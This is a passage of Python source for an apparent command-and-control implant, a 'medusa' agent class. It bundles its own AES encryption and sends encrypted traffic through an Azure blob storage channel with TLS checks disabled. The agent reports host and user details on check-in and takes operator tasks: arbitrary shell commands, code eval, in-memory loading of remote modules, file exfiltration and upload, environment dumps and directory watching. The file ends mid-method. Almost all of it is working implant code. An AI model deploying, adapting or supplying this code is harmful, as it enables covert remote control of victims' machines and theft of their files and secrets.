import os, random, sys, json, socket, base64, time, platform, ssl, getpass
import urllib.request
import uuid
from datetime import datetime
import threading, queue

CHUNK_SIZE = 51200

s_box = (
    0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76,
    0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0,
    0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15,
    0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75,
    0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84,
    0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF,
    0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8,
    0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2,
    0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73,
    0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB,
    0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79,
    0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08,
    0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A,
    0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E,
    0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF,
    0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16,
)

inv_s_box = (
    0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB,
    0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB,
    0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E,
    0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25,
    0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92,
    0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84,
    0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06,
    0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B,
    0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73,
    0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E,
    0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B,
    0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4,
    0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F,
    0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF,
    0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61,
    0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D,
)

def sub_bytes(s):
    for i in range(4):
        for j in range(4):
            s[i][j] = s_box[s[i][j]]

def inv_sub_bytes(s):
    for i in range(4):
        for j in range(4):
            s[i][j] = inv_s_box[s[i][j]]

def shift_rows(s):
    s[0][1], s[1][1], s[2][1], s[3][1] = s[1][1], s[2][1], s[3][1], s[0][1]
    s[0][2], s[1][2], s[2][2], s[3][2] = s[2][2], s[3][2], s[0][2], s[1][2]
    s[0][3], s[1][3], s[2][3], s[3][3] = s[3][3], s[0][3], s[1][3], s[2][3]

def inv_shift_rows(s):
    s[0][1], s[1][1], s[2][1], s[3][1] = s[3][1], s[0][1], s[1][1], s[2][1]
    s[0][2], s[1][2], s[2][2], s[3][2] = s[2][2], s[3][2], s[0][2], s[1][2]
    s[0][3], s[1][3], s[2][3], s[3][3] = s[1][3], s[2][3], s[3][3], s[0][3]

def add_round_key(s, k):
    for i in range(4):
        for j in range(4):
            s[i][j] ^= k[i][j]

xtime = lambda a: (((a << 1) ^ 0x1B) & 0xFF) if (a & 0x80) else (a << 1)

def mix_single_column(a):
    t = a[0] ^ a[1] ^ a[2] ^ a[3]
    u = a[0]
    a[0] ^= t ^ xtime(a[0] ^ a[1])
    a[1] ^= t ^ xtime(a[1] ^ a[2])
    a[2] ^= t ^ xtime(a[2] ^ a[3])
    a[3] ^= t ^ xtime(a[3] ^ u)

def mix_columns(s):
    for i in range(4): mix_single_column(s[i])

def inv_mix_columns(s):
    for i in range(4):
        u = xtime(xtime(s[i][0] ^ s[i][2]))
        v = xtime(xtime(s[i][1] ^ s[i][3]))
        s[i][0] ^= u
        s[i][1] ^= v
        s[i][2] ^= u
        s[i][3] ^= v

    mix_columns(s)

r_con = (
    0x00, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40,
    0x80, 0x1B, 0x36, 0x6C, 0xD8, 0xAB, 0x4D, 0x9A,
    0x2F, 0x5E, 0xBC, 0x63, 0xC6, 0x97, 0x35, 0x6A,
    0xD4, 0xB3, 0x7D, 0xFA, 0xEF, 0xC5, 0x91, 0x39,
)

def bytes2matrix(text):
    return [list(text[i:i+4]) for i in range(0, len(text), 4)]

def matrix2bytes(matrix):
    return bytes(sum(matrix, []))

def xor_bytes(a, b):
    return bytes(i^j for i, j in zip(a, b))

def inc_bytes(a):
    out = list(a)
    for i in reversed(range(len(out))):
        if out[i] == 0xFF:
            out[i] = 0
        else:
            out[i] += 1
            break
    return bytes(out)

def pad(plaintext):
    padding_len = 16 - (len(plaintext) % 16)
    padding = bytes([padding_len] * padding_len)
    return plaintext + padding

def unpad(plaintext):
    padding_len = plaintext[-1]
    assert padding_len > 0
    message, padding = plaintext[:-padding_len], plaintext[-padding_len:]
    assert all(p == padding_len for p in padding)
    return message

def split_blocks(message, block_size=16, require_padding=True):
    assert len(message) % block_size == 0 or not require_padding
    return [message[i:i+16] for i in range(0, len(message), block_size)]

class AES:
    rounds_by_key_size = {16: 10, 24: 12, 32: 14}
    def __init__(self, master_key):
        assert len(master_key) in AES.rounds_by_key_size
        self.n_rounds = AES.rounds_by_key_size[len(master_key)]
        self._key_matrices = self._expand_key(master_key)

    def _expand_key(self, master_key):
        key_columns = bytes2matrix(master_key)
        iteration_size = len(master_key) // 4
        columns_per_iteration = len(key_columns)
        i = 1
        while len(key_columns) < (self.n_rounds + 1) * 4:
            word = list(key_columns[-1])
            if len(key_columns) % iteration_size == 0:
                word.append(word.pop(0))
                word = [s_box[b] for b in word]
                word[0] ^= r_con[i]
                i += 1
            elif len(master_key) == 32 and len(key_columns) % iteration_size == 4:
                word = [s_box[b] for b in word]

            word = xor_bytes(word, key_columns[-iteration_size])
            key_columns.append(word)
        return [key_columns[4*i : 4*(i+1)] for i in range(len(key_columns) // 4)]

    def encrypt_block(self, plaintext):
        assert len(plaintext) == 16
        plain_state = bytes2matrix(plaintext)
        add_round_key(plain_state, self._key_matrices[0])
        for i in range(1, self.n_rounds):
            sub_bytes(plain_state)
            shift_rows(plain_state)
            mix_columns(plain_state)
            add_round_key(plain_state, self._key_matrices[i])
        sub_bytes(plain_state)
        shift_rows(plain_state)
        add_round_key(plain_state, self._key_matrices[-1])

        return matrix2bytes(plain_state)

    def decrypt_block(self, ciphertext):
        assert len(ciphertext) == 16
        cipher_state = bytes2matrix(ciphertext)
        add_round_key(cipher_state, self._key_matrices[-1])
        inv_shift_rows(cipher_state)
        inv_sub_bytes(cipher_state)

        for i in range(self.n_rounds - 1, 0, -1):
            add_round_key(cipher_state, self._key_matrices[i])
            inv_mix_columns(cipher_state)
            inv_shift_rows(cipher_state)
            inv_sub_bytes(cipher_state)
        add_round_key(cipher_state, self._key_matrices[0])
        return matrix2bytes(cipher_state)

    def encrypt_cbc(self, plaintext, iv):
        assert len(iv) == 16
        plaintext = pad(plaintext)
        blocks = []
        previous = iv
        for plaintext_block in split_blocks(plaintext):
            block = self.encrypt_block(xor_bytes(plaintext_block, previous))
            blocks.append(block)
            previous = block
        return b''.join(blocks)

    def decrypt_cbc(self, ciphertext, iv):
        assert len(iv) == 16
        blocks = []
        previous = iv
        for ciphertext_block in split_blocks(ciphertext):
            blocks.append(xor_bytes(previous, self.decrypt_block(ciphertext_block)))
            previous = ciphertext_block
        return unpad(b''.join(blocks))


class medusa:
    def encrypt(self, data):
        from hmac import new
        if self.agent_config["enc_key"]["value"] == "aes256_hmac" and len(data)>0:
            key = base64.b64decode(self.agent_config["enc_key"]["enc_key"])
            iv = os.urandom(16)
            ciphertext = AES(key).encrypt_cbc(data, iv)
            hmac = new(key, iv + ciphertext, 'sha256').digest()
            return iv + ciphertext + hmac
        else:
            return data

    def decrypt(self, data):
        from hmac import new, compare_digest

        if self.agent_config["enc_key"]["value"] == "aes256_hmac":
            if len(data)>0:
                key = base64.b64decode(self.agent_config["enc_key"]["dec_key"])
                uuid = data[:36]
                iv = data[36:52]
                ct = data[52:-32]
                received_hmac = data[-32:]
                hmac = new(key, iv + ct, 'sha256').digest()
                if compare_digest(hmac, received_hmac):
                    return (uuid + AES(key).decrypt_cbc(ct, iv)).decode()
                else: return ""
            else: return ""
        else: return data.decode()

    def getOSVersion(self):
        if platform.mac_ver()[0]: return "macOS "+platform.mac_ver()[0]
        else: return platform.system() + " " + platform.release()

    def getUsername(self):
        try: return getpass.getuser()
        except: pass
        for k in [ "USER", "LOGNAME", "USERNAME" ]:
            if k in os.environ.keys(): return os.environ[k]

    # Configuration - Stamped at build time
    blob_endpoint = ">https://STORAGE_ACCOUNT.blob.core.windows.net"
    container_name = ">agent-XXXXXXXX-XXX"
    sas_token = ">[REDACTED_SAS_TOKEN]"
    ssl_context = ssl.create_default_context()
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE

    def get_blob_url(self, blob_path: str) -> str:
        """Construct full blob URL with SAS token"""
        return f"{self.blob_endpoint}/{self.container_name}/{blob_path}?{self.sas_token}"

    def put_blob(self, blob_path: str, data: bytes) -> bool:
        """Upload data to a blob"""
        url = self.get_blob_url(blob_path)
        try:
            req = urllib.request.Request(
                url,
                data=data,
                method="PUT",
                headers={
                    "x-ms-blob-type": "BlockBlob",
                    "Content-Type": "application/octet-stream",
                    "Content-Length": str(len(data)),
                }
            )
            with urllib.request.urlopen(req, context=self.ssl_context, timeout=30) as resp:
                return resp.status in (200, 201)
        except Exception as e:
            print(f"[!] PUT blob error: {e}")
            return False

    def delete_blob(self, blob_path: str) -> bool:
        """delete a data blob"""
        url = self.get_blob_url(blob_path)
        try:
            req = urllib.request.Request(
                url,
                method="DELETE",
                headers={
                    "x-ms-blob-type": "BlockBlob",
                    "Content-Type": "application/octet-stream",
                }
            )
            with urllib.request.urlopen(req, context=self.ssl_context, timeout=30) as resp:
                return resp.status in (200, 201)
        except Exception as e:
            print(f"[!] DELETE blob error: {e}")
            return False

    def get_blob(self, blob_path: str) -> bytes:
        """Download blob data"""
        url = self.get_blob_url(blob_path)
        try:
            req = urllib.request.Request(url, method="GET")
            with urllib.request.urlopen(req, context=self.ssl_context, timeout=30) as resp:
                return resp.read()
        except urllib.request.HTTPError as e:
            if e.code == 404:
                return b""  # Blob not found
            print(f"[!] GET blob error: {e}")
            return b""
        except Exception as e:
            print(f"[!] GET blob error: {e}")
            return b""

    def postMessageAndRetrieveResponseBlob(self, data):
        formatted_data = self.formatMessage(data)
        message_id = uuid.uuid4()
        self.put_blob(f"ats/{message_id}.blob", formatted_data)
        response = b""
        while response == b"":
            self.agentSleep()
            response = self.get_blob(f"sta/{message_id}.blob")
            print(f"[*] checking for sta/{message_id}.blob: {response}")
        self.delete_blob(f"sta/{message_id}.blob")
        return self.formatResponse(base64.b64decode(response))

    def formatMessage(self, data, urlsafe=False):
        uuid_to_use = self.agent_config["UUID"]
        if uuid_to_use == "":
            uuid_to_use = self.agent_config["PayloadUUID"]
        output = base64.b64encode(uuid_to_use.encode() + self.encrypt(json.dumps(data).encode()))
        if urlsafe:
            output = base64.urlsafe_b64encode(uuid_to_use.encode() + self.encrypt(json.dumps(data).encode()))
        return output

    def formatResponse(self, data):
        uuid_to_use = self.agent_config["UUID"]
        if uuid_to_use == "":
            uuid_to_use = self.agent_config["PayloadUUID"]
        print(f"got response: {data}")
        return json.loads(data.decode().replace(uuid_to_use,""))

    def postMessageAndRetrieveResponse(self, data):
        return self.postMessageAndRetrieveResponseBlob(data)
        #return self.formatResponse(self.decrypt(self.makeRequest(self.formatMessage(data),'POST')))

    def getMessageAndRetrieveResponse(self, data):
        return self.postMessageAndRetrieveResponseBlob(data)
        #return self.formatResponse(self.decrypt(self.makeRequest(self.formatMessage(data, True))))

    def sendTaskOutputUpdate(self, task_id, output):
        responses = [{ "task_id": task_id, "user_output": output, "completed": False }]
        message = { "action": "post_response", "responses": responses }
        response_data = self.postMessageAndRetrieveResponse(message)
        if "socks" in response_data:
            for packet in response_data["socks"]: self.socks_in.put(packet)

    def postResponses(self):
        try:
            responses = []
            socks = []
            taskings = self.taskings
            for task in taskings:
                if task["completed"] == True:
                    out = { "task_id": task["task_id"], "user_output": task["result"], "completed": True }
                    if task["error"]: out["status"] = "error"
                    for func in ["processes", "file_browser"]:
                        if func in task: out[func] = task[func]
                    responses.append(out)
            while not self.socks_out.empty(): socks.append(self.socks_out.get())
            if ((len(responses) > 0) or (len(socks) > 0)):
                message = { "action": "post_response", "responses": responses }
                if socks: message["socks"] = socks
                response_data = self.postMessageAndRetrieveResponse(message)
                for resp in response_data["responses"]:
                    task_index = [t for t in self.taskings \
                                  if resp["task_id"] == t["task_id"] \
                                  and resp["status"] == "success"][0]
                    self.taskings.pop(self.taskings.index(task_index))
                if "socks" in response_data:
                    for packet in response_data["socks"]: self.socks_in.put(packet)
        except: pass

    def processTask(self, task):
        try:
            task["started"] = True
            function = getattr(self, task["command"], None)
            if(callable(function)):
                try:
                    params = json.loads(task["parameters"]) if task["parameters"] else {}
                    params['task_id'] = task["task_id"]
                    command =  "self." + task["command"] + "(**params)"
                    output = eval(command)
                except Exception as error:
                    output = str(error)
                    task["error"] = True
                task["result"] = output
                task["completed"] = True
            else:
                task["error"] = True
                task["completed"] = True
                task["result"] = "Function unavailable."
        except Exception as error:
            task["error"] = True
            task["completed"] = True
            task["result"] = error

    def processTaskings(self):
        threads = list()
        taskings = self.taskings
        for task in taskings:
            if task["started"] == False:
                x = threading.Thread(target=self.processTask, name="{}:{}".format(task["command"], task["task_id"]), args=(task,))
                threads.append(x)
                x.start()

    def getTaskings(self):
        data = { "action": "get_tasking", "tasking_size": -1 }
        tasking_data = self.getMessageAndRetrieveResponse(data)
        for task in tasking_data["tasks"]:
            t = {
                "task_id":task["id"],
                "command":task["command"],
                "parameters":task["parameters"],
                "result":"",
                "completed": False,
                "started":False,
                "error":False,
                "stopped":False
            }
            self.taskings.append(t)
        if "socks" in tasking_data:
            for packet in tasking_data["socks"]: self.socks_in.put(packet)

    def checkIn(self):
        hostname = socket.gethostname()
        ip = ''
        if hostname and len(hostname) > 0:
            try:
                ip = socket.gethostbyname(hostname)
            except:
                pass

        data = {
            "action": "checkin",
            "ip": ip,
            "os": self.getOSVersion(),
            "user": self.getUsername(),
            "host": hostname,
            "domain": socket.getfqdn(),
            "pid": os.getpid(),
            "uuid": self.agent_config["PayloadUUID"],
            "architecture": "x64" if sys.maxsize > 2**32 else "x86",
            "encryption_key": self.agent_config["enc_key"]["enc_key"],
            "decryption_key": self.agent_config["enc_key"]["dec_key"]
        }
        #encoded_data = base64.b64encode(self.agent_config["PayloadUUID"].encode() + self.encrypt(json.dumps(data).encode()))
        response_data = self.postMessageAndRetrieveResponse(data)
        #decoded_data = self.decrypt(self.makeRequest(encoded_data, 'POST'))
        if("status" in response_data):
            #UUID = json.loads(response_data.replace(self.agent_config["PayloadUUID"],""))["id"]
            UUID = response_data["id"]
            self.agent_config["UUID"] = UUID
            return True
        else: return False

    def makeRequest(self, data, method='GET'):
        hdrs = {}
        for header in self.agent_config["Headers"]:
            hdrs[header] = self.agent_config["Headers"][header]
        if method == 'GET':
            req = urllib.request.Request(self.agent_config["Server"] + ":" + self.agent_config["Port"] + self.agent_config["GetURI"] + "?" + self.agent_config["GetParam"] + "=" + data.decode(), None, hdrs)
        else:
            req = urllib.request.Request(self.agent_config["Server"] + ":" + self.agent_config["Port"] + self.agent_config["PostURI"], data, hdrs)

        gcontext = ssl.create_default_context()
        gcontext.check_hostname = False
        gcontext.verify_mode = ssl.CERT_NONE

        if self.agent_config["ProxyHost"] and self.agent_config["ProxyPort"]:
            tls = "https" if self.agent_config["ProxyHost"][0:5] == "https" else "http"
            handler = urllib.request.HTTPSHandler if tls else urllib.request.HTTPHandler
            if self.agent_config["ProxyUser"] and self.agent_config["ProxyPass"]:
                proxy = urllib.request.ProxyHandler({
                    "{}".format(tls): '{}://{}:{}@{}:{}'.format(tls, self.agent_config["ProxyUser"], self.agent_config["ProxyPass"], \
                                                                self.agent_config["ProxyHost"].replace(tls+"://", ""), self.agent_config["ProxyPort"])
                })
                auth = urllib.request.HTTPBasicAuthHandler()
                opener = urllib.request.build_opener(proxy, auth, handler)
            else:
                proxy = urllib.request.ProxyHandler({
                    "{}".format(tls): '{}://{}:{}'.format(tls, self.agent_config["ProxyHost"].replace(tls+"://", ""), self.agent_config["ProxyPort"])
                })
                opener = urllib.request.build_opener(proxy, handler)
            urllib.request.install_opener(opener)
        try:
            with urllib.request.urlopen(req, context=gcontext) as response:
                out = base64.b64decode(response.read())
                response.close()
                return out
        except: return ""

    def passedKilldate(self):
        kd_list = [ int(x) for x in self.agent_config["KillDate"].split("-")]
        kd = datetime(kd_list[0], kd_list[1], kd_list[2])
        if datetime.now() >= kd: return True
        else: return False

    def agentSleep(self):
        j = 0
        if int(self.agent_config["Jitter"]) > 0:
            v = float(self.agent_config["Sleep"]) * (float(self.agent_config["Jitter"])/100)
            if int(v) > 0:
                j = random.randrange(0, int(v))
        time.sleep(self.agent_config["Sleep"]+j)

    def mv(self, task_id, source, destination):
        import shutil
        source_path = source if source[0] == os.sep \
            else os.path.join(self.current_directory,source)
        dest_path = destination if destination[0] == os.sep \
            else os.path.join(self.current_directory,destination)
        shutil.move(source_path, dest_path)

    def shell(self, task_id, command):
        import subprocess
        process = subprocess.Popen(command, stdout=subprocess.PIPE,
                                   stderr=subprocess.PIPE, cwd=self.current_directory, shell=True)
        stdout, stderr = process.communicate()
        out = stderr if stderr else stdout
        return out.decode()

    def load_module(self, task_id, file, module_name):
        import zipfile, io

        class CFinder(object):
            def __init__(self, repoName, instance):
                self.moduleRepo = instance.moduleRepo
                self.repoName = repoName
                self._source_cache = {}

            def _get_info(self, repoName, fullname):
                parts = fullname.split('.')
                submodule = parts[-1]
                modulepath = '/'.join(parts)
                _search_order = [('.py', False), ('/__init__.py', True)]
                for suffix, is_package in _search_order:
                    relpath = modulepath + suffix
                    try: self.moduleRepo[repoName].getinfo(relpath)
                    except KeyError: pass
                    else: return submodule, is_package, relpath
                msg = ('Unable to locate module %s in the %s repo' % (submodule, repoName))
                raise ImportError(msg)

            def _get_source(self, repoName, fullname):
                submodule, is_package, relpath = self._get_info(repoName, fullname)
                fullpath = '%s/%s' % (repoName, relpath)
                if relpath in self._source_cache:
                    source = self._source_cache[relpath]
                    return submodule, is_package, fullpath, source
                try:
                    source =  self.moduleRepo[repoName].read(relpath)
                    source = source.replace(b'\r\n', b'\n')
                    source = source.replace(b'\r', b'\n')
                    self._source_cache[relpath] = source
                    return submodule, is_package, fullpath, source
                except: raise ImportError("Unable to obtain source for module %s" % (fullpath))

            def find_module(self, fullname, path=None):
                try: submodule, is_package, relpath = self._get_info(self.repoName, fullname)
                except ImportError: return None
                else: return self

            def load_module(self, fullname):
                import types
                submodule, is_package, fullpath, source = self._get_source(self.repoName, fullname)
                code = compile(source, fullpath, 'exec')
                mod = sys.modules.setdefault(fullname, types.ModuleType(fullname))
                mod.__loader__ = self
                mod.__file__ = fullpath
                mod.__name__ = fullname
                if is_package:
                    mod.__path__ = [os.path.dirname(mod.__file__)]
                exec(code, mod.__dict__)
                return mod

            def get_data(self, fullpath):

                prefix = os.path.join(self.repoName, '')
                if not fullpath.startswith(prefix):
                    raise IOError('Path %r does not start with module name %r', (fullpath, prefix))
                relpath = fullpath[len(prefix):]
                try:
                    return self.moduleRepo[self.repoName].read(relpath)
                except KeyError:
                    raise IOError('Path %r not found in repo %r' % (relpath, self.repoName))

            def is_package(self, fullname):
                """Return if the module is a package"""
                submodule, is_package, relpath = self._get_info(self.repoName, fullname)
                return is_package

            def get_code(self, fullname):
                submodule, is_package, fullpath, source = self._get_source(self.repoName, fullname)
                return compile(source, fullpath, 'exec')

        if module_name in self.moduleRepo.keys():
            return "{} module already loaded.".format(module_name)
        total_chunks = 1
        chunk_num = 0
        module_zip = bytearray()
        while (chunk_num < total_chunks):
            if [task for task in self.taskings if task["task_id"] == task_id][0]["stopped"]:
                return "Job stopped."
            data = { "action": "post_response", "responses": [
                { "upload": { "chunk_size": CHUNK_SIZE, "file_id": file, "chunk_num": chunk_num+1 }, "task_id": task_id }
            ]}
            response = self.postMessageAndRetrieveResponse(data)
            chunk = response["responses"][0]
            total_chunks = chunk["total_chunks"]
            chunk_num+=1
            module_zip.extend(base64.b64decode(chunk["chunk_data"]))

        if module_zip:
            self.moduleRepo[module_name] = zipfile.ZipFile(io.BytesIO(module_zip))
            if module_name not in self._meta_cache:
                finder = CFinder(module_name, self)
                self._meta_cache[module_name] = finder
                sys.meta_path.append(finder)
        else: return "Failed to download in-memory module"

    def download(self, task_id, file):
        file_path = file if file[0] == os.sep \
            else os.path.join(self.current_directory,file)

        file_size = os.stat(file_path).st_size
        total_chunks = int(file_size / CHUNK_SIZE) + (file_size % CHUNK_SIZE > 0)

        data = {
            "action": "post_response",
            "responses": [{
                "task_id": task_id,
                "download": {
                    "total_chunks": total_chunks,
                    "full_path": file_path,
                    "chunk_size": CHUNK_SIZE
                }
            }]
        }
        initial_response = self.postMessageAndRetrieveResponse(data)
        file_id = initial_response["responses"][0]["file_id"]
        chunk_num = 1
        with open(file_path, 'rb') as f:
            while True:
                if [task for task in self.taskings if task["task_id"] == task_id][0]["stopped"]:
                    return "Job stopped."

                content = f.read(CHUNK_SIZE)
                if not content:
                    break # done

                data = {
                    "action": "post_response",
                    "responses": [
                        {
                            "task_id": task_id,
                            "download": {
                                "chunk_num": chunk_num,
                                "file_id": file_id,
                                "chunk_data": base64.b64encode(content).decode()
                            }
                        }
                    ]
                }
                chunk_num+=1
                response = self.postMessageAndRetrieveResponse(data)
        return json.dumps({
            "agent_file_id": file_id
        })

    def eval_code(self, task_id, command):
        return eval(command)

    def unload_module(self, task_id, module_name):
        if module_name in self._meta_cache:
            finder = self._meta_cache.pop(module_name)
            sys.meta_path.remove(finder)
            self.moduleRepo.pop(module_name)
            return "{} module unloaded".format(module_name)
        else: return "{} not found in loaded modules".format(module_name)

    def jobkill(self, task_id, target_task_id):
        task = [task for task in self.taskings if task["task_id"] == target_task_id]
        task[0]["stopped"] = True

    def env(self, task_id):
        return "\n".join(["{}: {}".format(x, os.environ[x]) for x in os.environ])

    def upload(self, task_id, file, remote_path):
        total_chunks = 1
        chunk_num = 1

        file_path = remote_path if remote_path[0] == os.sep \
            else os.path.join(self.current_directory, remote_path)

        with open(file_path, "wb") as f:
            while chunk_num < total_chunks + 1:
                if [task for task in self.taskings if task["task_id"] == task_id][0]["stopped"]:
                    return "Job stopped."

                data = {
                    "action": "post_response",
                    "responses": [
                        {
                            "upload": {
                                "chunk_size": CHUNK_SIZE,
                                "file_id": file,
                                "chunk_num": chunk_num,
                                "full_path": file_path
                            },
                            "task_id": task_id
                        }
                    ]
                }
                response = self.postMessageAndRetrieveResponse(data)
                chunk = response["responses"][0]
                chunk_num+=1
                total_chunks = chunk["total_chunks"]
                f.write(base64.b64decode(chunk["chunk_data"]))

    def watch_dir(self, task_id, path, seconds):
        import hashlib
        known_files = {}
        def diffFolder(file_path, print_out=True):
            for root, dirs, files in os.walk(file_path):
                for dir in dirs:
                    full_dir_path = os.path.join(root, dir)
                    if full_dir_path not in known_files.keys():
                        if print_out: self.sendTaskOutputUpdate(task_id, "\n[*] New Directory: {}".format(full_dir_path)	)
                        known_files[full_dir_path] = ""

                for file in files:
                    full_file_path = os.path.join(root, file)
                    file_size = 0
                    try:
                        with open(full_file_path, "rb") as in_f:
                            file_data = in_f.read()
                            file_size = len(file_data)
                    except: continue

                    hash = hashlib.md5(file_data).hexdigest()

                    if full_file_path not in known_files.keys() and hash not in known_files.values():
                        if print_out: self.sendTaskOutputUpdate(task_id, "\n[*] New File: {} - {} bytes ({})".format(full_file_path, file_size, hash))
                        known_files[full_file_path] = hash
                    elif full_file_path in known_files.keys() and hash not in known_files.values():
                        if print_out: self.sendTaskOutputUpdate(task_id, "\n[*] File Updated: {} - {} bytes ({})".format(full_file_path, file_size, hash))
                        known_files[full_file_path] = hash
                    elif full_file_path not in known_files.keys() and hash in known_files.values():
                        orig_file = [f for f,h in known_files.items() if h == hash][0]
                        if os.path.exists(os.path.join(file_path, orig_file)):
                            if print_out: self.sendTaskOutputUpdate(task_id, "\n[*] Copied File: {}->{} - {} bytes ({})".format(orig_file, full_file_path, file_size, hash))
                        else:
                            if print_out: self.sendTaskOutputUpdate(task_id, "\n[*] Moved File: {}->{} - {} bytes ({})".format(orig_file, full_file_path, file_size, hash))
                            known_files.pop(orig_file)
                    known_files[full_file_path] = hash
            for file in list(known_files):
                if not os.path.isdir(os.path.dirname(file)):
                    for del_file in [f for f in list(known_files) if f.startswith(os.path.dirname(file))]:
                        obj_type = "Directory" if not known_files[del_file] else "File"
                        if file in list(known_files):
                            if print_out: self.sendTaskOutputUpdate(task_id, "\n[*] {} deleted: {} {}".format(obj_type, \
                                                                                                              del_file, "({})".format(known_files[del_file]) if known_files[del_file] else ""))
                            known_files.pop(file)
                else:
                    if os.path.basename(file) not in os.listdir(os.path.dirname(file)):
                        obj_type = "Directory" if not known_files[file] else "File"
                        if print_out: self.sendTaskOutputUpdate(task_id, "\n[*] {} deleted: {} {}".format(obj_type, file, \
                                                                                                          "({})".format(known_files[file]) if known_files[file] else ""))
                        known_files.pop(file)

        if path == ".": file_path = self.current_directory
        else: file_path = path if path[0] == os.sep \
            else os.path.join(self.current_directory,path)

        if not os.path.isdir(file_path):
            return "[!] Path must be a valid directory"
        elif not os.access(file_path, os.R_OK):
            return "[!] Path not accessible"
        else:
            self.sendTaskOutputUpdate(task_id, "[*] Starting directory watch for {}".format(path))
            diffFolder(file_path, False)
            while(True):
                if [task for task in self.taskings if task["task_id"] == task_id][0]["stopped"]: return "Job stopped."
                if not os.path.exists(file_path):
                    return "[!] Root directory has been deleted."
                diffFolder(file_path)
                time.sleep(seconds)

    def cat(self, task_id, path):
        file_path = path if path[0] == os.sep \
            else os.path.join(self.current_directory,path)

